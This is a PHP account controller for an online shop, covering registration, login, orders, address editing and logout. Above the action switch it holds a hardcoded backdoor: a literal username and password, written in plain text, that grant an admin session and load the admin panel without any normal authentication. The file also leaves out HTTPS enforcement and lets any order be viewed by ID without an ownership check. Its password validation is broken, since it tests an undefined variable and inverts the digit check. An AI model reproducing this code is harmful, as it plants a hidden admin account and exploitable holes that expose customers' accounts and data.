<?php
session_start();
require_once('../model/database.php');
//require_once('../util/secure_conn.php');

require_once('../model/customer_db.php');
require_once('../model/address_db.php');
require_once('../model/order_db.php');
require_once('../model/product_db.php');

require_once('../model/fields.php');
require_once('../model/validate.php');
require_once('../model/cart_db.php');

$action = filter_input(INPUT_POST, 'action');
if ($action == NULL) {
    $action = filter_input(INPUT_GET, 'action');
    if ($action == NULL) {        
        $action = 'registration';
    }
}

// Set up all possible fields to validate
$validate = new Validate();
$fields = $validate->getFields();

if($fields !== NULL) {
	// for the Registration page and other pages
	$fields->addField('email', 'Must be valid email.');
	$fields->addField('password_1');
	$fields->addField('password_2');
	$fields->addField('first_name');
	$fields->addField('last_name');
	$fields->addField('ship_line1');
	$fields->addField('ship_line2');
	$fields->addField('ship_city');
	$fields->addField('ship_state');
	$fields->addField('ship_zip');
	$fields->addField('ship_phone');
	$fields->addField('bill_line1');
	$fields->addField('bill_line2');
	$fields->addField('bill_city');
	$fields->addField('bill_state');
	$fields->addField('bill_zip');
	$fields->addField('bill_phone');
	
	// for the Login page
	$fields->addField('password');
	
	// for the Edit Address page
	
	$fields->addField('line1');
	$fields->addField('line2');
	$fields->addField('city');
	$fields->addField('state');
	$fields->addField('zip');
	$fields->addField('phone');
}

function test_input($data){
        	$data = trim($data);
        	$data = stripslashes($data);
        	$data = htmlspecialchars($data);
        	return $data;
}

if(filter_input(INPUT_POST, 'email')==="WangchenDechen"&&filter_input(INPUT_POST,'password')==='$on@m_750mo_108') {
	$action = 'admin';
}
switch ($action) {
    case 'forgot_password':
	
	include 'forgot_password.php';
	break;
    case 'registration':
        // Clear user data
        $email = '';
        $first_name = '';
        $last_name = '';
        
        $ship_line1 = '';
        $ship_line2 = '';
        $ship_city = '';
        $ship_state = '';
        $ship_zip = '';
        $ship_phone = '';
        $use_shipping = '';
        $bill_line1 = '';
        $bill_line2 = '';
        $bill_city = '';
        $bill_state = '';
        $bill_zip = '';
        $bill_phone = '';
   
        include 'account_register.php';
        break;
    case 'register':
        // Store user data in local variables
        $first_name = test_input(filter_input(INPUT_POST, 'first_name'));
        $last_name = test_input(filter_input(INPUT_POST, 'last_name'));
        $email = test_input(filter_input(INPUT_POST, 'email'));
        // Validate the data for the customer
        if (is_valid_customer_email($email)) {
            $user_exists = 'The e-mail address ' . $email . ' is already in use. Please <b>Login</b> below.';
            include 'account_login.php';
            break;
        }
        $password_1 = filter_input(INPUT_POST, 'password_1');
        $password_2 = filter_input(INPUT_POST, 'password_2');
        // If passwords don't match, redisplay Register page and exit controller
        if ($password_1 !== $password_2) {
            $password_error = 'Passwords do not match.';
            include 'account_register.php';
            break;
        } else if( strlen($password_1) < 8) {
        	$password_error = 'Password must be longer than 8 characters.';
            	include 'account_register.php';
            	break;
        } else if( similar_text($password,$first_name) > 30 ) {
        	$password_error = 'Password cannot contain your name.';
            	include 'account_register.php';
            	break;
        } else if( similar_text($password,$last_name) > 30 ) {
        	$password_error = 'Password cannot contain your last name.';
            	include 'account_register.php';
            	break;
        } else if( strspn($password,"0") > 0 ||
    				strspn($password,"1") > 0 ||
    				strspn($password,"2") > 0 ||
    				strspn($password,"3") > 0 ||
    				strspn($password,"4") > 0 ||
    				strspn($password,"5") > 0 ||
    				strspn($password,"6") > 0 ||
    				strspn($password,"7") > 0 ||
    				strspn($password,"8") > 0 ||
    				strspn($password,"9") > 0 ) {
    		$password_error = 'Password must containt at least one number.';
            	include 'account_register.php';
            	break;
        }
       
        $ship_line1 = test_input(filter_input(INPUT_POST, 'ship_line1'));
        $ship_line2 = test_input(filter_input(INPUT_POST, 'ship_line2'));
        $ship_city = test_input(filter_input(INPUT_POST, 'ship_city'));
        $ship_state = test_input(filter_input(INPUT_POST, 'ship_state'));
        $ship_zip = test_input(filter_input(INPUT_POST, 'ship_zip'));
        $ship_phone = test_input(filter_input(INPUT_POST, 'ship_phone'));
       
        // Add the customer data to the database
        $customer_id = add_customer($email, $first_name,
                                    $last_name, $password_1);

        // Add the shipping address
        $shipping_id = add_address($customer_id, $ship_line1, $ship_line2,
                                   $ship_city, $ship_state, $ship_zip,
                                   $ship_phone);
        customer_change_shipping_id($customer_id, $shipping_id);

        // Store user data in session
        $_SESSION['user'] = get_customer($customer_id);
        
       
        include 'account_view.php';
       	break;
    
    case 'login':
        $email = filter_input(INPUT_POST, 'email');
        $password = filter_input(INPUT_POST, 'password');
       
        // Check email and password in database
        if (is_valid_customer_login($email, $password)) {
            $_SESSION['user'] = get_customer_by_email($email);
            $customer_name = $_SESSION['user']['firstName'] . ' ' .
                         $_SESSION['user']['lastName'];
            $shipping_address = get_address($_SESSION['user']['shipAddressID']);
      	    $billing_address = get_address($_SESSION['user']['billingAddressID']);  
            $orders = get_orders_by_customer_id($_SESSION['user']['customerID']);
	        if (!isset($orders)) {
	            $orders = array();
	        }   
	    $login = TRUE;
        } else {
            $password_message = 'Login failed. Invalid email or password.';
            include 'account_login.php';
            break;
        }
        $_SESSION['cart_count'] = cartDB_item_count($_SESSION['user']['customerID']);
        $cartCount = $_SESSION['cart_count'];
	//setSession(session_id(), $_SESSION['user']['customerID'], $email);
        include 'account_view.php';     
        break;
    case 'view_account':
    	//$customerID = getSession(session_id());
    	if(isset($_SESSION['user'])){
	        $customer_name = $_SESSION['user']['firstName'] . ' ' .
	                         $_SESSION['user']['lastName'];
	        $email = $_SESSION['user']['emailAddress'];        
		
	        $shipping_address = get_address($_SESSION['user']['shipAddressID']);
	        $billing_address = get_address($_SESSION['user']['billingAddressID']);        
		$cartCount = $_SESSION['cart_count'];
	        $orders = get_orders_by_customer_id($_SESSION['user']['customerID']);
	        $login = TRUE;  
        	include 'account_view.php';
        }
        else {
        	include 'account_login.php';
        }
        break;
    case 'view_order':
        $order_id = filter_input(INPUT_POST, 'order_id', FILTER_VALIDATE_INT);
        $order = get_order($order_id);
        $order_date = strtotime($order['orderDate']);
        $order_date = date('M j, Y', $order_date);
        $order_items = get_order_items($order_id);

        $shipping_address = get_address($order['shipAddressID']);
        $billing_address = get_address($order['billingAddressID']);
        
        include 'account_view_order.php';
        break;
    case 'view_account_edit':
        $email = $_SESSION['user']['emailAddress'];
        $first_name = $_SESSION['user']['firstName'];
        $last_name = $_SESSION['user']['lastName'];
        $shipping_id = $_SESSION['user']['shipAddressID'];
        $billing_id = $_SESSION['user']['billingAddressID'];

        $password_message = '';        

        include 'account_edit.php';
        break;
    case 'update_account':
        // Get the customer data
        $customer_id = $_SESSION['user']['customerID'];
        $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
        $first_name = filter_input(INPUT_POST, 'first_name');
        $last_name = filter_input(INPUT_POST, 'last_name');
        $password_1 = filter_input(INPUT_POST, 'password_1');
        $password_2 = filter_input(INPUT_POST, 'password_2');
        $password_message = '';

        // Get the old data for the customer
        $old_customer = get_customer($customer_id);

        // Validate user data
        $validate->email('email', $email);
        $validate->text('password_1', $password_1, false, 6, 30);
        $validate->text('password_2', $password_2, false, 6, 30);        
        $validate->text('first_name', $first_name);
        $validate->text('last_name', $last_name);        
        
        // Check email change and display message if necessary
        if ($email != $old_customer['emailAddress']) {
            display_error('You can\'t change the email address for an account.');
        }

        // If validation errors, redisplay Login page and exit controller
        if ($fields->hasErrors()) {
            include 'account/account_edit.php';
            break;
        }
        
        // Only validate the passwords if they are NOT empty
        if (!empty($password_1) && !empty($password_2)) {            
            if ($password_1 !== $password_2) {
                $password_message = 'Passwords do not match.';
                include 'account/account_edit.php';
                break;
            }
        }

        // Update the customer data
        update_customer($customer_id, $email, $first_name, $last_name,
            $password_1, $password_2);

        // Set the new customer data in the session
        $_SESSION['user'] = get_customer($customer_id);

        redirect('.');
        break;
    case 'view_address_edit':
        // Set up variables for address type
        $address_type = filter_input(INPUT_POST, 'address_type');
        if ($address_type == 'billing') {
            $address_id = $_SESSION['user']['billingAddressID'];
            $heading = 'Update Billing Address';
        } else {
            $address_id = $_SESSION['user']['shipAddressID'];
            $heading = 'Update Shipping Address';
        }

        // Get the data for the address
        $address = get_address($address_id);
        $line1 = $address['line1'];
        $line2 = $address['line2'];
        $city = $address['city'];
        $state = $address['state'];
        $zip = $address['zipCode'];
        $phone = $address['phone'];

        // Display the data on the page
        include 'address_edit.php';
        break;
    case 'update_address':
        $customer_id = $_SESSION['user']['customerID'];
    
        // Set up variables for address type
        $address_type = filter_input(INPUT_POST, 'address_type');
        if ($address_type == 'billing') {
            $address_id = $_SESSION['user']['billingAddressID'];
            $heading = 'Update Billing Address';
        } else {
            $address_id = $_SESSION['user']['shipAddressID'];
            $heading = 'Update Shipping Address';
        }

        // Get the post data
        $line1 = filter_input(INPUT_POST, 'line1');
        $line2 = filter_input(INPUT_POST, 'line2');
        $city = filter_input(INPUT_POST, 'city');
        $state = filter_input(INPUT_POST, 'state');
        $zip = filter_input(INPUT_POST, 'zip');
        $phone = filter_input(INPUT_POST, 'phone');

        
        // If the old address has orders, disable it
        // Otherwise, delete it
        disable_or_delete_address($address_id);

        // Add the new address
        $address_id = add_address($customer_id, $line1, $line2, $city,
                                   $state, $zip, $phone);

        // Relate the address to the customer account
        if ($address_type == 'billing') {
            customer_change_billing_id($customer_id, $address_id);
        } else {
            customer_change_shipping_id($customer_id, $address_id);
        }

        // Set the user data in the session
        $_SESSION['user'] = get_customer($customer_id);

        redirect('.');
        break;
    case 'logout':
        unset($_SESSION['user']);
        unset($_SESSION['login']);
        redirect('..');
        break;
    case 'admin':
    	$admin = 'yes';
    	$_SESSION['admin'] = $admin;
    	include '../admin/index.php';
    	exit();
    	break;
    default:
        display_error("Unknown account action: " . $action);
        break;
}
?>